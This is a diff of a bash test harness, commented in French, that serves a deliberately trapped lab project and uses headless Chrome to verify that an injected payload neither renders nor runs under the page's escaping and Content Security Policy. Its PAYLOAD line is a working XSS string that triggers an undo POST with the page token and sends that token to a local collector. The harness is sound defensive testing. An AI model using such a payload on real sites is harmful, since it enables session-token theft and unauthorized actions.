@@ -19,6 +19,8 @@ export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
 SCRIPTS="$(cd "$(dirname "$0")/.." && pwd)"
 WORK="$(mktemp -d)"; WORK="$(cd "$WORK" && pwd -P)"; AUX="$WORK/aux"; mkdir -p "$AUX" "$WORK/home"
 export REAL_HOME="$HOME"; export HOME="$WORK/home"
+export CHROME_SESSION="$(cd "$(dirname "$0")" && pwd)/chrome-session.mjs"
+libre() { node -e "const s=require('net').createServer().listen(0,'127.0.0.1',()=>{console.log(s.address().port);s.close()})"; } # port libre choisi à l'exécution
 PIDS=()
 cleanup() { for p in ${PIDS[@]+"${PIDS[@]}"}; do kill "$p" 2>/dev/null; wait "$p" 2>/dev/null; done; [ -n "${KEEP:-}" ] || rm -rf "$WORK"; }
 trap cleanup EXIT
@@ -49,31 +51,16 @@ const r = http.request({ host: '127.0.0.1', port: Number(port), path: p, method,
 r.on('error', (e) => console.log('ERR ' + e.message)); r.end();
 JS
 cat > "$AUX/browser.mjs" <<'JS'
-// browser.mjs <chrome> <url> <attenteMs> : ouvre la page en Chrome headless (CDP), rend { charges, violations }
+// browser.mjs <chrome> <url> <graceMs> : ouvre la page en Chrome headless (socle chrome-session.mjs), rend { charges, cartes, violations }
 // charges = éléments portant un attribut onerror dans le DOM rendu (la charge du lab est-elle devenue du HTML ?)
-import { spawn } from 'node:child_process'; import fs from 'node:fs'; import os from 'node:os'; import path from 'node:path';
-const [, , chrome, url, wait] = process.argv;
-const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'chaine-chrome-'));
-const ch = spawn(chrome, ['--headless=new', '--no-sandbox', '--disable-gpu', '--no-first-run', '--no-default-browser-check', `--user-data-dir=${dir}`, '--remote-debugging-port=0', 'about:blank'], { stdio: ['ignore', 'ignore', 'pipe'], env: { ...process.env, HOME: process.env.REAL_HOME || process.env.HOME } });
-const fin = (o) => { try { ch.kill('SIGKILL'); } catch {} try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} console.log(JSON.stringify(o)); process.exit(0); };
-setTimeout(() => fin({ erreur: 'delai' }), 40000);
-let buf = ''; ch.stderr.on('data', async (d) => {
-  buf += d; const m = /ws:\/\/127\.0\.0\.1:(\d+)\//.exec(buf); if (!m || ch.started) return; ch.started = true;
-  try {
-    const port = m[1];
-    const t = await (await fetch(`http://127.0.0.1:${port}/json/new?about:blank`, { method: 'PUT' })).json();
-    const ws = new WebSocket(t.webSocketDebuggerUrl); let id = 0; const pend = new Map(); const violations = [];
-    const send = (method, params = {}) => new Promise((res) => { const i = ++id; pend.set(i, res); ws.send(JSON.stringify({ id: i, method, params })); });
-    ws.onmessage = (e) => { const j = JSON.parse(e.data); if (j.id && pend.has(j.id)) pend.get(j.id)(j.result); else if (j.method === 'Log.entryAdded' && /Content Security Policy|Refused to/i.test(j.params.entry.text)) violations.push(j.params.entry.text.slice(0, 160)); };
-    await new Promise((r) => (ws.onopen = r));
-    await send('Log.enable'); await send('Page.enable');
-    await send('Page.navigate', { url });
-    await new Promise((r) => setTimeout(r, Number(wait)));
-    const r = await send('Runtime.evaluate', { expression: 'document.querySelectorAll("[onerror]").length', returnByValue: true });
-    const c = await send('Runtime.evaluate', { expression: 'document.querySelectorAll(".card").length', returnByValue: true });
-    fin({ charges: r?.result?.value ?? -1, cartes: c?.result?.value ?? -1, violations });
-  } catch (e) { fin({ erreur: String(e.message) }); }
-});
+// La page est relevée quand elle est PRÊTE (load + au moins une carte dessinée), jamais après un délai fixe ; mesure indisponible -> { erreur } nommée.
+import { pathToFileURL } from 'node:url';
+const { executer, pause } = await import(pathToFileURL(process.env.CHROME_SESSION).href);
+const [, , chrome, url, grace] = process.argv;
+await executer(chrome, async (s) => {
+  await s.naviguer(url); await s.attendre("document.readyState === 'complete' && document.querySelectorAll('.card').length >= 1", 'cartes dessinées'); await pause(Number(grace) || 0);
+  return { charges: await s.ev('document.querySelectorAll("[onerror]").length'), cartes: await s.ev('document.querySelectorAll(".card").length'), violations: [...s.violations] };
+}, { csp: true });
 JS
 cat > "$AUX/simul.mjs" <<'JS'
 // simul.mjs <port> : sans navigateur. Rejoue cardFoot (extrait de la page Projet servie) sur la charge du lab ; rend { charges }
@@ -95,7 +82,7 @@ JS
 jq_() { node -e "const j=JSON.parse(require('fs').readFileSync(0,'utf8'));const v=(function(j){return ($1)})(j);console.log(typeof v==='string'?v:JSON.stringify(v))"; }
 
 # --- lab piégé ---
-COLL_PORT=$((5400 + RANDOM % 400)); COLL_LOG="$WORK/collecteur.log"; : > "$COLL_LOG"
+COLL_PORT="$(libre)"; COLL_LOG="$WORK/collecteur.log"; : > "$COLL_LOG"
 node "$AUX/collect.mjs" "$COLL_PORT" "$COLL_LOG" & PIDS+=($!)
 PAYLOAD="<img src=x onerror=fetch('/api/plan/undo',{method:'POST',headers:{'x-vf-cockpit-token':VF_COCKPIT_SERVER.token}});fetch('http://127.0.0.1:$COLL_PORT/?t='+VF_COCKPIT_SERVER.token)>"
 LAB="$WORK/lab"; mkdir -p "$LAB/src" "$LAB/.planning/phases/01-x" "$LAB/evil/scripts"
@@ -132,15 +119,15 @@ manche() {
   local m; for m in "$@"; do mutant "$o" "$m" || { R_CHARGES="mutant-sans-effet"; return; }; done
   rm -f "$WORK/MARQUEUR-SCRIPT-DU-LAB"; : > "$COLL_LOG"
   local eng="$SCRIPTS/../skills/cockpit-moteur"
-  ( cd "$LAB" && VF_COCKPIT_ENGINE_DIR="$eng" VF_COCKPIT_SCRIPTS_DIR="$SCRIPTS" node "$o/serve.mjs" --no-open --port $((4900 + RANDOM % 400)) > "$WORK/serve-$label.out" 2>&1 ) &
+  ( cd "$LAB" && VF_COCKPIT_ENGINE_DIR="$eng" VF_COCKPIT_SCRIPTS_DIR="$SCRIPTS" node "$o/serve.mjs" --no-open --port "$(libre)" > "$WORK/serve-$label.out" 2>&1 ) &
   local pid=$!; PIDS+=($pid)
   for _ in $(seq 1 100); do [ -s "$o/.cache/server.json" ] && grep -q '"port"' "$o/.cache/server.json" && break; sleep 0.1; done
   local port; port="$(node -e "console.log(JSON.parse(require('fs').readFileSync('$o/.cache/server.json','utf8')).port)")"
   local res
   if [ -n "$CHROME" ]; then
-    res="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/project.html#v=n:ph-1" 5000)"
+    res="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/project.html#v=n:ph-1" 1500)"
     R_VIOL="$(printf '%s' "$res" | jq_ 'j.violations.length')"; R_CARTES="$(printf '%s' "$res" | jq_ 'j.cartes')"
-    R_CODE="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/index.html" 5000)"
+    R_CODE="$(node "$AUX/browser.mjs" "$CHROME" "http://127.0.0.1:$port/index.html" 1500)"
   else
     res="$(node "$AUX/simul.mjs" "$port")"
     # charge jouée par le client : le jeton de la page (si la page l'a), POST, exfiltration (bloquée seulement par la CSP)
@@ -156,6 +143,16 @@ manche() {
       fi
     fi
   fi
+  # les effets de la charge (script du lab, jeton chez l'origine tierce) arrivent de façon asynchrone : on les ATTEND quand la manche doit
+  # les voir (échéance VF_CDP_ECHEANCE_S, 60 s), on laisse seulement une courte grâce quand elle doit constater leur absence
+  local want=""; case "$label" in temoin) want="marq exfil" ;; garde) want="exfil" ;; esac
+  local fin=$((SECONDS + ${VF_CDP_ECHEANCE_S:-60}))
+  while [ "$SECONDS" -lt "$fin" ]; do
+    local ok=1
+    case " $want " in *" marq "*) [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] || ok=0 ;; esac
+    case " $want " in *" exfil "*) grep -q '?t=[0-9a-f]\{16,\}' "$COLL_LOG" || ok=0 ;; esac
+    [ "$ok" = 1 ] && break; [ -z "$want" ] && break; sleep 0.2
+  done
   sleep 1
   kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
   R_CHARGES="$(printf '%s' "$res" | jq_ 'j.charges')"
